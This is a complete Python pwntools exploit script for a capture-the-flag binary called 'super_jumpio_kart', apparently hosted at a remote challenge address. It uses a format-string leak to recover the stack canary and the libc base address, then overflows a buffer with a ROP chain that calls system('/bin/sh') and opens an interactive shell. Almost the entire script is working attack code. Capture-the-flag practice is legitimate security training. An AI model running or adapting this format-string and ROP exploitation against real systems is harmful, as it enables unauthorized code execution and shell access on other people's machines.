#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './super_jumpio_kart'
elf = context.binary = ELF(exe, checksec=True)
libc = './glibc/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '94.237.122.117', 44521

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

# breakrva 0x15fd

breakrva 0x18bd
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec super_jumpio_kart
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
#     RUNPATH:  b'glibc/'

def exploit():
    global io
    io = initialize()

    io.sendlineafter(b'>', b'4')
    io.sendlineafter(b':', b'%9$p|%12$p|%p')

    io.recvuntil(b'with: ')
    canary = int(io.recvuntil(b'|', drop=True), 16)
    libc.address = int(io.recvuntil(b'|', drop=True), 16) - 0x203b20
    stack = int(io.recvline().strip(), 16)

    rop = ROP(libc)

    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    ret = rop.find_gadget(['ret'])[0]

    for i in range(7):
        s = io.recvuntil(b':')
        if b'RIGHT' in s:
            io.sendline(b'R')
        else:
            io.sendline(b'L')
    io.sendlineafter(b'>', b'y')

    payload = cyclic(0x48)
    payload += p64(canary)
    payload += cyclic(8*3)
    payload += flat([
        pop_rdi,
        next(libc.search(b'/bin/sh\x00')),
        ret,
        libc.sym['system'],
    ]) 
    io.sendafter(b':', payload)

    log.info("canary: %#x", canary)
    log.info("libc: %#x", libc.address)
    log.info("stack: %#x", stack)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
